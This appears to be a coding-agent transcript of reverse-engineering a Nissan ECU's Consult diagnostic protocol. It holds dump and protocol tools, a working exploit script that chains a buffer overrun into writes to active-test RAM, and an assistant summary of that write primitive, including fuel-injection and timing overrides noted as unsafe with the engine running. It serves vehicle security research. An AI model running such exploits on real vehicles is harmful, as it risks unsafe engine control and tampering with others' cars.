1	#!/usr/bin/env python3
2	"""c9_h8_dump: read the second CPU (H8/3437) via Consult C9 forwarding.
3	
4	Addresses $5D40–$623F are forwarded by the engine ECU to the second CPU,
5	mapping to the H8's $0D40–$123F (1280 bytes). This script reads them in
6	small batches (≤8 per request, within c9_hidden's 10-entry limit) and
7	builds a hex dump of the H8's visible address space.
8	
9	H8 values arrive asynchronously: the ECU fills one payload slot per reply
10	frame, cycling through the queued addresses ($9B3F), so a single frame is
11	just one phase of that loop. Each batch streams a budget of frames and
12	majority-decodes per slot, flagging (??) any slot that never settles.
13	
14	Batch-size caveat: with batch=8, positions 6-7 of every batch are
15	contaminated by the c9_hidden reply mechanism ($0E/$1E artifacts). Use
16	--batch 6 for a clean dump, or --patch to re-read only the contaminated
17	positions from a prior batch=8 dump.
18	
19	Usage: python3 tools/c9_h8_dump.py [--dev /dev/ttyUSB0] [--range 5D40-623F]
20	                                   [--batch 6] [--frames 4] [--out dump.bin]
21	       python3 tools/c9_h8_dump.py --patch prior.bin --out clean.bin
22	"""
23	import argparse
24	import datetime
25	import os
26	import sys
27	import time
28	
29	ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
30	sys.path.insert(0, ROOT)
31	
32	from consult.protocol import Consult, ConsultError, ENGINE_IDS
33	from consult.transport import DEFAULT_DEV, Transport
34	
35	LOG_DIR = os.path.join(ROOT, "logs")
36	
37	FORWARD_LO = 0x5D40
38	FORWARD_HI = 0x623F
39	H8_OFFSET  = 0x5000
40	BATCH_SIZE  = 6
41	OLD_BATCH   = 8
42	CONTAMINATED_POS = (6, 7)
43	
44	
45	def contaminated_offsets(total, old_batch=OLD_BATCH, positions=CONTAMINATED_POS):
46	    """Return sorted list of byte offsets that were contaminated in a prior dump."""
47	    offsets = []
48	    for i in range(0, total, old_batch):
49	        for p in positions:
50	            if i + p < total:
51	                offsets.append(i + p)
52	    return sorted(offsets)
53	
54	
55	def read_forwarded(c, addrs, frames=0):
56	    """Stream one forwarded C9 block and majority-decode one byte per address.
57	
58	    The ECU queues every C9 address in the forwarded range and then fills one
59	    payload slot per reply frame from the second CPU, cycling through the queue
60	    (consult_reply_c9 tail, $9B3F). So a block of B addresses needs ~B+1 frames
61	    before every slot holds a real byte; taking a single frame (even "the last"
62	    one) just captures one arbitrary phase of that loop. We read a budget of
63	    frames and, per slot, keep the value only if the later frames agree, flagging
64	    any slot that never settles.
65	
66	    Returns (values, ok): ok[i] is False when slot i did not converge.
67	    """
68	    n = len(addrs)
69	    budget = frames if frames else 2 * n + 6
70	    payload = b"".join(bytes([0xC9, a >> 8, a & 0xFF]) for a in addrs)
71	    got = []
72	    try:
73	        c.command(payload)
74	        for _ in range(budget):
75	            try:
76	                got.append(list(c.read_frame(expected_len=n)))
77	            except TimeoutError:
78	                break
79	    finally:
80	        c.stop(timeout=0.5)
81	        c.t.drain(quiet=0.05)
82	    # Use the later half of the frames (the pipeline has filled by then) and keep
83	    # a slot only when those frames agree.
84	    late = got[len(got) // 2:]
85	    values, ok = bytearray(n), [False] * n
86	    for i in range(n):
87	        col = [f[i] for f in late if i < len(f)]
88	        values[i] = col[-1] if col else 0
89	        ok[i] = len(col) >= 2 and len(set(col)) == 1
90	    return values, ok
91	
92	
93	def hex_dump(data, base, width=16):
94	    lines = []
95	    for off in range(0, len(data), width):
96	        row = data[off:off + width]
97	        hex_part = " ".join(f"{b:02X}" for b in row)
98	        ascii_part = "".join(chr(b) if 0x20 <= b < 0x7F else "." for b in row)
99	        lines.append(f"  ${base + off:04X}: {hex_part:<{width * 3 - 1}s}  {ascii_part}")
100	    return "\n".join(lines)
101	
102	
103	def run_patch(args, lo, hi, h8_lo, h8_hi, all_addrs, batch_sz):
104	    """Re-read only the contaminated positions from a prior batch-8 dump."""

127	            print(f"  ... and {len(bad_offsets) - 16} more")
128	        return
129	
130	    os.makedirs(LOG_DIR, exist_ok=True)
131	    log = os.path.join(LOG_DIR, f"{datetime.date.today()}_h8-patch.log")
132	    t = Transport(args.dev, log)

134

136	        c = Consult(t)

138	        r = c.init()

141	        attempt, secs, junk, ecu = r

143

162	            except (ConsultError, TimeoutError) as e:

164	                failed += 1

169	
170	        elapsed = time.monotonic() - t0
171	        print(f"\r  done: {patched}/{len(bad_addrs)} patched in {elapsed:.1f} s"

173	        if unstable:
174	            print(f"  ⚠ {unstable}/{patched} re-read bytes never settled")
175	        if failed:

177	        print()

181

200	def main():
201	    ap = argparse.ArgumentParser(
202	        description=__doc__,
203	        formatter_class=argparse.RawDescriptionHelpFormatter)
204	    ap.add_argument("--dev", default=DEFAULT_DEV,

213	                    help="patch a prior batch-8 dump: re-read only contaminated positions")

215	    ap.add_argument("--dry-run", action="store_true",
216	                    help="show what would be read without talking to the ECU")

1	"""Consult-I protocol layer (CONSULT_PROTOCOL.md §3–4).
2	
3	Read-side commands plus active tests (0A, CONSULT_PROTOCOL.md §7). DTC clear (C1) is
4	still left out on purpose.
5	"""
6	import time
7	
8	ENGINE = 0xEF
9	ENGINE_ALT = 0xED               # the 1998 Maxima's engine ECU answers ED (reply 12), not EF
10	ENGINE_IDS = (ENGINE_ALT, ENGINE)
11	STOP = 0x30
12	GO = 0xF0
13	STOP_ACKS = (0xCF, 0xFE)        # both seen on the A32 (CONSULT_PROTOCOL.md §3, rule 7)
14	ACTIVE = 0x0A
15	
16	# Number of argument bytes that follow each command byte (echoed verbatim).
17	NARGS = {0x5A: 1, 0xC9: 2, 0x0A: 2}
18	
19	
20	class ConsultError(IOError):
21	    pass
22	
23	
24	def expected_echo(payload: bytes) -> bytes:
25	    out = bytearray()
26	    i = 0
27	    while i < len(payload):
28	        cmd = payload[i]
29	        n = NARGS.get(cmd, 0)
30	        out.append(~cmd & 0xFF)
31	        out += payload[i + 1:i + 1 + n]
32	        i += 1 + n
33	    return bytes(out)
34	
35	
36	class Consult:
37	    def __init__(self, transport):
38	        self.t = transport
39	
40	    def stop(self, timeout=2.0):
41	        """Send 30 and read until a stop ack. Returns (ack byte or None, bytes before it).
42	
43	        Whole frames are skipped by length, so a data byte that happens to be CF or FE
44	        isn't taken for the ack. Only whole frames come before the ack (checklist 1.5).
45	        """
46	        self.t.write(bytes([STOP]))
47	        self._frame_started = False
48	        before = bytearray()
49	        end = time.monotonic() + timeout
50	        while time.monotonic() < end:
51	            b = self.t.read(1, timeout=0.3)
52	            if not b:
53	                continue
54	            before += b
55	            if b[0] == 0xFF:
56	                n = self.t.read(1, timeout=0.3)
57	                before += n
58	                if n:
59	                    before += self.t.read(n[0], timeout=0.3)
60	                continue
61	            if b[0] in STOP_ACKS:
62	                return b[0], bytes(before[:-1])
63	        return None, bytes(before)
64	
65	    def init(self, ecu=ENGINE_IDS, tries=5, wait=2.0, pre_stop=True, gaps=(0.28, 0.07)):
66	        """Send FF FF <ecu> until ~ecu (10 for EF, 12 for ED) comes back.
67	
68	        `ecu` is one ID or a sequence of IDs tried in turn on each attempt. The
69	        default tries ED first and then EF: the 1998 Maxima answers ED. After a
70	        wrong-ID init the ECU ignores everything, including 30, until it gets a
71	        correct init.
72	
73	        `gaps` are the pauses after the first and second FF. ECUTalk 1.5.0 sends the
74	        three bytes separately with Sleep(Delay1=280 ms) and Sleep(Delay2=70 ms) in
75	        between (decompiled from ECUTalk). Pass gaps=None to send them back to back.
76	
77	        Returns (attempt number, seconds from TX to the reply, other bytes seen, id)
78	        on success, or None.
79	        """
80	        ids = (ecu,) if isinstance(ecu, int) else tuple(ecu)
81	        for n in range(tries * len(ids)):
82	            attempt, ecu = n // len(ids) + 1, ids[n % len(ids)]
83	            if pre_stop:
84	                self.stop(timeout=0.5)
85	                self.t.drain(quiet=0.2)
86	            if gaps:
87	                self.t.write(b"\xFF")
88	                time.sleep(gaps[0])
89	                self.t.write(b"\xFF")
90	                time.sleep(gaps[1])
91	                self.t.write(bytes([ecu]))
92	            else:
93	                self.t.write(bytes([0xFF, 0xFF, ecu]))
94	            sent = time.monotonic()
95	            junk = bytearray()
96	            while time.monotonic() - sent < wait:
97	                b = self.t.read(1, timeout=0.2)
98	                if not b:
99	                    continue
100	                if b[0] == 0xFF:
101	                    # A frame from a unit still streaming (the BCM keeps streaming

113	        return None

115	    def command(self, payload: bytes, retries=2):
116	        """Send a command list, check the echo, then send F0 to start streaming.
117	
118	        The 1998 Maxima (seen 2026-11-14) sometimes answers a valid command with FE FE
119	        in place of the first echo pair, and sometimes echoes it correctly but answers
120	        F0 with FE and sends no frames. Both are retried after a stop.
121	        """
122	        want = expected_echo(payload)
123	        why = ""
124	        for n in range(retries + 1):
125	            got = self._send(payload, want)
126	            if got == want:
127	                self.t.write(bytes([GO]))
128	                first = self.t.read(1, timeout=0.5)
129	                if first == b"\xFF":
130	                    self._frame_started = True   # read_frame: FF already consumed
131	                    return
132	                why = f"F0 answered with {first.hex() or '(none)'}"
133	            else:
134	                why = f"bad echo {got.hex(' ') or '(none)'}, expected {want.hex(' ')}"
135	            self.t.note(f"command try {n + 1} failed: {why}")
136	            self.stop(timeout=0.5)
137	            self.t.drain(quiet=0.1)
138	        raise ConsultError(why)
139	
140	    @property
141	    def paced(self):
142	        # The BCM (DA) answers FE to a command list sent in one burst, but accepts the
143	        # same bytes sent one at a time, each after its echo (2026-11-14).
144	        return getattr(self, "ecu", ENGINE) not in ENGINE_IDS
145	
146	    def _send(self, payload, want):
147	        if not self.paced:
148	            self.t.write(payload)
149	            return self.t.read(len(want), timeout=0.5)
150	        got = bytearray()
151	        for i, b in enumerate(payload):
152	            self.t.write(bytes([b]))
153	            e = self.t.read(1, timeout=0.3)
154	            got += e
155	            if e != want[i:i + 1]:
156	                break
157	        return bytes(got)
158	
159	    def read_frame(self, expected_len=None, timeout=1.0) -> bytes:
160	        """Read one FF <n> <data...> frame, parsing by length (data may contain FF)."""
161	        end = time.monotonic() + timeout
162	        while time.monotonic() < end:
163	            if getattr(self, "_frame_started", False):
164	                self._frame_started = False
165	            else:
166	                b = self.t.read(1, timeout=timeout)
167	                if not b:
168	                    break
169	                if b[0] != 0xFF:
170	                    continue
171	            n = self.t.read(1, timeout=0.3)
172	            if not n:
173	                break
174	            n = n[0]
175	            if expected_len is not None and n != expected_len:
176	                continue
177	            data = self.t.read(n, timeout=0.3)
178	            if len(data) == n:
179	                return data
180	        raise TimeoutError("no frame")
181	
182	    def one_shot(self, payload: bytes, expected_len=None) -> bytes:
183	        """Command, read a single frame, stop."""
184	        self.command(payload)
185	        try:
186	            return self.read_frame(expected_len)
187	        finally:
188	            self.stop()
189	
190	    def read_registers(self, regs):
191	        return b"".join(bytes([0x5A, r]) for r in regs)
192	
193	    def part_number(self):
194	        d = self.one_shot(bytes([0xD0]))
195	        pn = None
196	        tail = d[-5:]
197	        engine = getattr(self, "ecu", ENGINE) in ENGINE_IDS
198	        if len(d) >= 5 and all(0x30 <= b < 0x5B for b in tail):
199	            # 1998 Maxima: frame ending in ASCII, e.g. "2L904" = 23710-2L904. Only the
200	            # engine ECU is known to be 23710-; other units get the bare suffix.
201	            pn = ("23710-" if engine else "?-") + tail.decode("ascii")
202	        elif engine and len(d) >= 22:
203	            pn = f"{d[2]:02X}{d[3]:02X} 23710-{d[19]:X}{d[20]:02X}{d[21]:02X}"
204	        return d, pn
205	
206	    def read_memory(self, addrs):
207	        """C9: one byte from each address (1..8 per request, CONSULT_PROTOCOL.md §4)."""
208	        if not 1 <= len(addrs) <= 8:
209	            raise ValueError("C9 takes 1..8 addresses per request")
210	        payload = b"".join(bytes([0xC9, a >> 8, a & 0xFF]) for a in addrs)
211	        return self.one_shot(payload, expected_len=len(addrs))
212	
213	    def dtcs(self):
214	        d = self.one_shot(bytes([0xD1]))
215	        return d, [(d[i], d[i + 1]) for i in range(0, len(d) - 1, 2)]
216	
217	    def active_test(self, test, value, hold=5.0, on_rx=None):
218	        """Send 0A <test> <value> F0, hold for `hold` seconds, then stop (30).
219	
220	        No retries: a bad echo stops and raises. The stop is sent whatever happens,
221	        including Ctrl-C, and resent up to 3 times if it isn't acknowledged.
222	        `on_rx(bytes)` is called with whatever the ECU sends during the hold.
223	
224	        Returns (bytes received during the hold, stop ack or None).
225	        """
226	        payload = bytes([ACTIVE, test, value])
227	        want = expected_echo(payload)
228	        got = bytearray()
229	        try:
230	            echo = self._send(payload, want)    # paced for the BCM
231	            if echo != want:
232	                raise ConsultError(f"bad echo {echo.hex(' ') or '(none)'}, expected {want.hex(' ')}")
233	            self.t.write(bytes([GO]))
234	            self.t.note(f"active test {test:02X}={value:02X} on, holding {hold:.1f} s")
235	            end = time.monotonic() + hold
236	            while time.monotonic() < end:
237	                chunk = self.t.read(64, timeout=0.2)
238	                if chunk:
239	                    got += chunk
240	                    if on_rx:
241	                        on_rx(chunk)
242	        finally:
243	            ack = None
244	            for _ in range(3):
245	                ack, _ = self.stop()
246	                if ack is not None:
247	                    break
248	            self.t.note(f"active test {test:02X} stopped, ack {ack if ack is None else f'{ack:02X}'}")
249	        return bytes(got), ack

91	def simulate(addrs):

105	    def rw(addr):
106	        return rb(addr) | (rb(addr + 1) << 8)
107	
108	    def ww(addr, val):
109	        wb(addr, val & 0xFF)
110	        wb(addr + 1, (val >> 8) & 0xFF)

126	        if not is_hidden:

141	                          f"(8-bit, n_reread=${n_reread:02X})")
142	            wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)

1	#!/usr/bin/env python3
2	"""c9_actuator_test: exploit the c9_find_hidden overrun to write to active-test state.

6	  2. The downstream consult_reply_c9 OOB write (corrupted c9_hidden_idx causes
7	     the per-frame reply builder to write c9_sub_value to an arbitrary offset
8	     in cs_payload, reaching $0740–$083F)
9	
10	The overrun at i=12 corrupts $07E3 (the "forwarded present" flag) by writing
11	the loop counter $0C, which clears bit 0 — the reply builder then skips all
12	hidden processing. To repair this, we send 18 addresses (not 16) with
13	specific values at positions 15–17 so the addr_store at i=16 overwrites
14	$07E3 with a value that has bit 0 SET.
15	
16	The 18-address payload:
17	  [0..14]  15 × main trigger addr  (populates idx[0..9] with target byte)
18	  [15]     repair addr A           (sets up n=$10 for i=16)
19	  [16]     repair addr B           (addr_store → $07E3, lo byte has bit 0)
20	  [17]     main trigger addr       (writes target byte to idx[$0E] = cursor start)
21	
22	The reply builder ($9B3F) processes ONE hidden entry per frame: it reads
23	c9_hidden_idx[cursor], writes c9_sub_value to cs_payload[idx_val], then
24	advances the cursor (wrapping at c9_hidden_n). With the repaired flag,
25	the first frame writes the overrun's stale $07E7 value to the target.
26	
27	NOTE: at_active writes are confirmed (probe shows sustained $02/$0B during
28	streaming). However, relay tests ($89 fuel pump, $93/$94 fan) have NO BBC
29	handler in the main CPU ROM — the relay drivers may be on the H8 second CPU,
30	which receives commands via serial, not by reading at_active directly.
31	Parameter-override tests ($81 fuel injection, $82 timing, $85 IACV) DO have
32	BBC handlers and would fire, but are unsafe with engine running.
33	
34	SAFE: writes to Consult/active-test state only. No RAM function pointers,
35	no code redirect. Engine off. Key cycle clears all corruption.
36	
37	Usage: python3 tools/c9_actuator_test.py [--target 07B7] [--trigger 6178]
38	                                         [--dev /dev/ttyUSB0] [--dry-run]
39	"""

77	    (0x07C3, 0x14, "c9_hidden_addr[0..9]"),
78	    (0x07D7, 0x0A, "c9_hidden_idx[0..9]"),

94	
95	def build_payload(target, trigger_override=None):
96	    """Build the 18-address C9 payload that targets a specific RAM byte.
97	
98	    Returns (addr_list, main_addr, repair_a, repair_b) or None if no valid
99	    address exists.
100	
101	    The payload is:
102	      [0..14]  15 × main_addr    — overrun fills idx[0..9] with target byte
103	      [15]     repair_a           — sets up n for i=16's addr_store to hit $07E3
104	      [16]     repair_b           — addr_store writes lo byte (bit 0 set) to $07E3
105	      [17]     main_addr          — writes target byte to idx at cursor position
106	
107	    Repair logic (from the $9B3F disassembly):
108	      At i=15, addr_store writes word to $07E1/$07E2.  To make n=$10 at i=16
109	      we need the idx_store at i=15 to leave $07E1 such that INC → $10.
110	      The idx_store reads lo byte of $07E1 as n, writes i=15=$0F to $07D7+n,
111	      then INC.  With lo=$0A: idx_store → $07D7+$0A = $07E1, writes $0F,
112	      INC → $10.  At i=16 (n=$10), addr_store → $07C3+$20 = $07E3, writes
113	      the word for repair_b.  repair_b's lo byte must be ODD (bit 0 set).
114	      We use lo=$0B → $07E3 = $0B (bits 0+1 both set).
115	    """
116	    idx = (target - CS_PAYLOAD) & 0xFF
117	
118	    if trigger_override is not None:
119	        main_addr = trigger_override
120	        word = main_addr - 0x5000
121	        if (word & 0xFF) != idx:
122	            return None
123	        if not (FORWARD_LO <= main_addr <= FORWARD_HI):
124	            return None
125	    else:
126	        for base in (0x5E00, 0x5F00, 0x6000, 0x6100, 0x6200, 0x5D00):
127	            main_addr = base + idx
128	            if FORWARD_LO <= main_addr <= FORWARD_HI:
129	                break
130	        else:
131	            return None
132	
133	    # Repair addr A (position 15): lo byte = $0A so n ends up at $10 for i=16
134	    # Needs to be in forwarded range
135	    repair_a = 0x5E0A
136	    # Repair addr B (position 16): lo byte = $0B (odd, sets bit 0 of $07E3)
137	    repair_b = 0x5E0B
138	
139	    if not (FORWARD_LO <= repair_a <= FORWARD_HI and
140	            FORWARD_LO <= repair_b <= FORWARD_HI):
141	        return None
142	
143	    addrs = [main_addr] * 15 + [repair_a, repair_b, main_addr]
144	    return addrs, main_addr, repair_a, repair_b
145	
146	
147	def simulate_overrun(addr_list):
148	    """Simulate c9_find_hidden with the given address list.
149	
150	    Models the exact instruction sequence from $543F, including m-flag widths.
151	    Returns (ram dict, event log).
152	    """
153	    ram = {}
154	
155	    def rb(a): return ram.get(a, 0)
156	    def wb(a, v): ram[a] = v & 0xFF
157	    def rw(a): return rb(a) | (rb(a + 1) << 8)
158	    def ww(a, v): wb(a, v & 0xFF); wb(a + 1, (v >> 8) & 0xFF)
159	
160	    cs_argc = len(addr_list) * 2
161	    for i, a in enumerate(addr_list):
162	        ww(0x08D2 + 2 * i, a)
163	
164	    wb(HIDDEN_N, 0)
165	    wb(FWD_FLAGS, rb(FWD_FLAGS) & ~0x03)  # CLB $07E3,#$03
166	    events = []
167	
168	    for i in range(20):
169	        a_val = rw(0x08D2 + 2 * i)
170	        if not (FORWARD_LO <= a_val < 0x6240):
171	            if 2 * (i + 1) >= cs_argc:
172	                break
173	            continue
174	
175	        wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x01)  # SEB $07E3,#$01
176	        n = rb(HIDDEN_N)
177	        addr_idx = (2 * n) & 0xFF
178	        addr_dest = HIDDEN_ADDR + addr_idx
179	        word = a_val - 0x5000
180	        ww(addr_dest, word)
181	
182	        dest_label = ""
183	        if addr_dest == HIDDEN_N:
184	            dest_label = " ← $07E1 (c9_hidden_n)"
185	        elif addr_dest == HIDDEN_N - 1:
186	            dest_label = " (hits $07E0/$07E1)"
187	        elif addr_dest == FWD_FLAGS:
188	            dest_label = " ← $07E3 (fwd_flags!)"
189	        elif addr_dest == FWD_FLAGS - 1:
190	            dest_label = " (hits $07E2/$07E3)"
191	        events.append(f"  i={i:2d}  n={n:3d}  addr=${a_val:04X}  "
192	                      f"addr_store: [{addr_dest:04X}] <- ${word:04X}{dest_label}")
193	
194	        n_re = rw(HIDDEN_N) & 0xFF
195	        idx_dest = HIDDEN_IDX + n_re
196	        idx_label = ""
197	        if idx_dest == HIDDEN_N:
198	            idx_label = " ← $07E1"
199	        elif idx_dest == REPLY_CURSOR:
200	            idx_label = " ← $07E2"
201	        elif idx_dest == FWD_FLAGS:
202	            idx_label = " ← $07E3 (fwd_flags!)"
203	        events.append(f"         idx_store:  [{idx_dest:04X}] <- ${i:02X}{idx_label}")
204	
205	        wb(idx_dest, i)
206	        wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)
207	
208	        if 2 * (i + 1) >= cs_argc:
209	            break
210	
211	    # Summary
212	    n_final = rb(HIDDEN_N)
213	    cursor = rb(REPLY_CURSOR)
214	    flags = rb(FWD_FLAGS)
215	    events.append("")
216	    events.append(f"  c9_hidden_n ($07E1) = ${n_final:02X} ({n_final})")
217	    events.append(f"  reply cursor ($07E2) = ${cursor:02X}")
218	    events.append(f"  fwd_flags ($07E3) = ${flags:02X}  "
219	                  f"bit0={'SET' if flags & 1 else 'CLR'}  "
220	                  f"bit1={'SET' if flags & 2 else 'CLR'}")
221	
222	    return ram, events
223	
224	
225	def simulate_reply_builder(ram, n_frames=20):
226	    """Model consult_reply_c9 ($9B3F) per-frame behavior with corrupted state.
227	
228	    The builder processes ONE hidden entry per frame:
229	      1. Check $07E3 bit 0 — if clear, skip (no forwarded addresses)
230	      2. Check $07E3 bit 1 — if clear, set it, cursor=0, request first addr (no write)
231	      3. If bit 1 set: read idx[cursor], write c9_sub_value to cs_payload[idx], advance
232	
233	    Returns list of (frame_num, target_addr, idx_val, cursor_before) for each write.
234	    """
235	    def rb(a): return ram.get(a, 0)
236	    def wb(a, v): ram[a] = v & 0xFF
237	
238	    flags = rb(FWD_FLAGS)
239	    if not (flags & 0x01):
240	        return []
241	
242	    writes = []
243	    for frame in range(n_frames):
244	        if not (rb(FWD_FLAGS) & 0x01):
245	            break
246	
247	        if not (rb(FWD_FLAGS) & 0x02):
248	            # First frame: set bit 1, cursor = 0, request first address, no value placed
249	            wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x02)
250	            wb(REPLY_CURSOR, 0)
251	        else:
252	            # Read c9_sub_value and place it
253	            sub_val = rb(0x07E7)
254	            cursor = rb(REPLY_CURSOR)
255	            idx_val = rb(HIDDEN_IDX + cursor)
256	            target = CS_PAYLOAD + idx_val
257	            writes.append((frame, target, idx_val, cursor, sub_val))
258	
259	            # Advance cursor
260	            new_cursor = (cursor + 1) & 0xFF
261	            if new_cursor == rb(HIDDEN_N):
262	                new_cursor = 0
263	            wb(REPLY_CURSOR, new_cursor)
264	
265	    return writes
266	
267	
268	def region_label(addr):
269	    for name, (lo, hi_) in [
270	        ("cs_payload", (CS_PAYLOAD, CS_PAYLOAD + 0x28)),
271	        ("at_values", (AT_VALUES, AT_VALUES + 0x2D)),
272	        ("cs_streamlist", (CS_STREAMLIST, CS_STREAMLIST + 4)),
273	        ("at_req", (AT_REQ, AT_REQ + 0x0B)),
274	        ("at_active", (AT_ACTIVE, AT_ACTIVE + 0x0C)),
275	    ]:
276	        if lo <= addr < hi_:
277	            return f"{name}[{addr - lo}]"
278	    return ""
279	
280	
281	def build_monitor_addrs():
282	    addrs = set()
283	    for start, length, _ in MONITOR_REGIONS:
284	        addrs.update(range(start, start + length))
285	    return sorted(addrs)
286	
287	
288	def read_addrs(c, addrs):
289	    result = bytearray()
290	    for i in range(0, len(addrs), 8):
291	        chunk = addrs[i:i + 8]
292	        result += c.read_memory(chunk)
293	    return bytes(result)
294	
295	
296	def region_dump(data, addrs, title):
297	    print(f"\n  {title}")

300	        row = [addr_to_val.get(start + i) for i in range(length)]
301	        cells = [f"{v:02X}" if v is not None else ".." for v in row]
302	        print(f"    ${start:04X}: {' '.join(cells)}  ; {label}")
303	
304	
305	def run_dry(target, addr_list, main_addr):

352	def run_live(dev, target, addr_list, main_addr, n_hold_frames=20):
353	    """Fire the overrun and monitor the target region."""
354	    # Append the target as a non-forwarded probe: it reads live RAM each frame,
355	    # giving us visibility into the downstream write WITHOUT waiting for stop.
356	    probe_list = addr_list + [target]

372	    try:

381

383	        print(f"\nReading {len(mon_addrs)} baseline bytes...")
384	        before = read_addrs(c, mon_addrs)

386	        region_dump(before, mon_addrs, "BEFORE (baseline)")
387	
388	        before_map = dict(zip(mon_addrs, before))
389	        target_before = before_map.get(target, 0)

391	
392	        # --- Trigger ---
393	        print(f"\nSending trigger: {n_addrs} C9 addresses "
394	              f"(18 overrun + 1 probe at ${target:04X}) + F0...")
395	        payload = b"".join(bytes([0xC9, a >> 8, a & 0xFF])
396	                          for a in probe_list)
397	        c.command(payload)
398	        t.note("trigger sent")

400	        # Stream frames — each fires one downstream write.
401	        # The last byte of each frame is the probe: live RAM at the target.
402	        frames = []

407	                frames.append(f)

409	                probe_vals.append(pv)
410	        except TimeoutError:

414	        print(f"  streamed {len(frames)} frame(s)")
415	
416	        # Per-frame probe values — this is the smoking gun
417	        print(f"\n  Per-frame probe (${target:04X} live RAM):")
418	        changed_frame = None
419	        for fi, pv in enumerate(probe_vals):
420	            marker = ""
421	            if pv is not None and pv != target_before and changed_frame is None:
422	                changed_frame = fi
423	                marker = " ◄ CHANGED"
424	            print(f"    frame {fi:2d}: ${pv:02X}{marker}" if pv is not None
425	                  else f"    frame {fi:2d}: ??")
426	
427	        if changed_frame is not None:
428	            print(f"\n  ✓ DOWNSTREAM WRITE VISIBLE on frame {changed_frame}: "
429	                  f"${target_before:02X} → ${probe_vals[changed_frame]:02X}")
430	        else:

## assistant 2026-11-16T00:43:35.425Z

Here's the write primitive and its limits:

**What it is:** A buffer overrun in `c9_find_hidden` ($543F) that chains into a second OOB write via the reply builder ($9B3F). You send 16–20 C9 addresses all inside the forwarded range ($5D40–$623F), then F0. The ECU's arrays only hold 10 entries, so from i=10 onward the stores walk off the end.

**Two stages:**

1. **Direct overrun** (c9_find_hidden): At i=15 the 16-bit addr store writes attacker-controlled data into `c9_hidden_n` ($07E1) and the reply cursor ($07E2). The 18-address payload in `c9_actuator_test.py` includes a repair sequence (positions 15–17) that fixes the flag byte ($07E3 bit 0) so the reply builder still runs.

2. **Downstream OOB** (consult_reply_c9): The corrupted `c9_hidden_idx[]` entries cause the per-frame write `cs_payload[idx] = c9_sub_value` to escape the 40-byte payload buffer, reaching `$0740–$083F`.

**Limits:**

| Constraint | Detail |
|---|---|
| **Destination range** | $0740–$08D6 (~275 bytes) via the direct overrun; $0740–$083F (256 bytes) via the downstream write |
| **Value range (direct)** | 16-bit word in $0D40–$123F (low byte free, high byte pinned $0D–$12), or the loop counter (0–19) |
| **Value range (downstream)** | One byte: whatever `c9_sub_value` ($07E7) holds — the H8's last reply byte, not directly caller-controlled |
| **What lives there** | `cs_payload` ($0740), `at_values` ($076F), `cs_streamlist` ($07A0), `at_req` ($07AC), `at_active` ($07B7), `c9_hidden_*`, `cs_argbuf` ($08D2) — all Consult/active-test handler state |
| **No code redirect** | No RAM function pointer exists anywhere in the image. The only indirect jump uses a ROM table. Bank 1 is unreachable (data bank register hardcoded to 0) |
| **Persistence** | Survives re-init. Only a key cycle clears it |
| **What you can't do** | Write outside the ~$0740–$08D6 window. Write to code space. Control the downstream byte value directly. Reach bank 1. Trigger actual relay outputs (relay drivers are on the H8, not readable from at_active) |
| **What you can do** | Set `at_active` flags (confirmed — sustained $02/$0B visible during streaming). Parameter-override tests ($81 injection, $82 timing, $85 IACV) have BBC handlers and *would* fire, but are unsafe with engine running |

In short: arbitrary byte-in-range write to ~275 bytes of live Consult handler state, no code execution, no escape to the wider address space.

490	  transfer, `JMP ($CBAB,X)` at `$CAF1` — a dispatch through a fixed 9-entry ROM table, `X`
491	  bounded 0–8 by the search loop, all targets in ROM. There is **no** jump or call
492	  through a RAM pointer anywhere, so there's no function pointer to corrupt even if a
493	  write reached one.
494	
495	**Conclusion:** the handler is tight. The only under-used *intended* capability is
496	`sub-dump` (the `$5D40–$623F` forward → the second CPU's `$0D40–$123F`), a different chip,
497	not bank 1. Bank 1 still needs silicon (§8c): a community full image for the 4L6xx family,
498	or a read of the `KNKT43J` H8.
499	
500	## 11. `0A` direct mode: a real bug and a more-permissive read path
501	
502	`0A` with a first byte `< $08` enters "direct mode" (the OBD Mode 6 / data-stream path,
503	§1), which loads `cs_streamlist` (`$07A0`) and then streams it back via
504	`consult_reply_direct` (`$9CDD`). Two findings here; neither leads anywhere today, but
505	the second is the most promising thread to pull if anything else turns up later.
506	
507	- **Bug: integer underflow / missing lower bound on the value byte** (`$5239`–`$531F`).
508	  For the "high" sub-paths (value `≥ $80`) the table offset is `(value − $80 − 1) × 4`.
509	  The per-branch check only bounds the top (e.g. `CMP #$84` at `L_5298`), so **`value =
510	  $80` is accepted and underflows**: `0 − 1 = $FF`, `× 4 = $3FC`, low byte `$FC`. The
511	  handler then reads two stream descriptors from `table_base + $FC`, far past the 16-byte
512	  table. Triggers: `0A <fb> 80` for `fb ∈ {0,2,5,6,7}`. `fb=0` self-rejects (the OOB
513	  words at `$EA6B` are `0000`); `fb=2/5/6/7` stream two bytes from fixed unintended ROM
514	  addresses (`$90F9`,`$A902` / `$5809`,`$2889` / `$42F8`,`$FF29` / `$0926`,`$8958`). The
515	  intended minimum was `value = $81` (offset 0). **No new access** — those are bank-0 ROM
516	  bytes `C9` already returns — but it is a genuine input-validation bug. Read-only and
517	  safe to poke on the car (direct mode writes no outputs); good for confirming the
518	  analysis.
519	- **`consult_reply_direct` has no bounds check and no forwarding.** It does `LDA
520	  $07A0,X; TAX; LDA $00,X` (`$9CF1`): it dereferences each `cs_streamlist` entry as a
521	  16-bit address and reads it **locally in data bank 0, with none of the `$5D40–$623F`
522	  forward / range logic that `consult_reply_c9` applies** (§1). So this path is more
523	  permissive than `C9`: an entry pointing into `$5D40–$623F` would read *this* CPU's
524	  hidden code there directly. It doesn't matter in practice, though — every reachable
525	  `cs_streamlist` value comes from fixed ROM (the descriptor tables `$E95F–$EA80`, or the
526	  fixed out-of-bounds bytes above), and scanning all of those tables found **no** entry in
527	  `$5D40–$623F`; there's no command that sets `cs_streamlist` to anything else. But it
528	  reframes the question: it's no longer "can the `C9` range check be gotten around" (there's
529	  none here to get around) but "**is there any way to write a chosen 16-bit value into
530	  `$07A0`**". None found — the active-test value write stops at `$079C`, the `cs_argbuf`
531	  overflow reaches only `$08FA` — so this stays a dead end, but it's the most promising
532	  remaining direction.
533	- **Swept — that write does not exist.** Checked every store in the ROM that targets
534	  `$07A0–$07A3`: there are exactly three (`$5224`, `$5327`, `$5331`), and all write
